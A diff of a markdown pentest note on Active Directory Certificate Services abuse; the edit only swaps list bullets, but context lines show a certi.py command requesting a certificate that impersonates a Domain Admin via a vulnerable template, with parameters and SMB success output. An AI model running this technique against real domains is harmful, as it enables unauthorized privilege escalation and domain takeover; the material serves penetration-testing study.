@@ -112,11 +112,11 @@ export KRB5CCNAME=johndo-lowpriv.ccache
 
 Parameters:
 
-* `offsec-DC01PKI-CA` - is found in the template `Enroll Services` field
-* `-k` - to use kerberos authentication
-* `-n` - 'no-pass' for use with `-k`
-* `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
-* `--template` - the vulnerable template name
+- `offsec-DC01PKI-CA` - is found in the template `Enroll Services` field
+- `-k` - to use kerberos authentication
+- `-n` - 'no-pass' for use with `-k`
+- `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
+- `--template` - the vulnerable template name
 
 ```plain
 $ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
@@ -251,7 +251,7 @@ SMB         DC01PKI.offsec.nl 445    DC01PKI         [+] offsec.nl\johnDomainAdm
 
 ## URL List
 
-* [Github.com - Certi](https://github.com/zer1t0/certi)
-* [Github.com - Active Directory Attacks - Active Directory Certificate Services](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-certificate-services)
-* [Gist.github.com - Flangvik - PKI Abuse Cheatsheet](https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)
-* [Ppn.snovvcrash.rocks - ADCS Abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse)
+- [Github.com - Certi](https://github.com/zer1t0/certi)
+- [Github.com - Active Directory Attacks - Active Directory Certificate Services](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-certificate-services)
+- [Gist.github.com - Flangvik - PKI Abuse Cheatsheet](https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)
+- [Ppn.snovvcrash.rocks - ADCS Abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse)
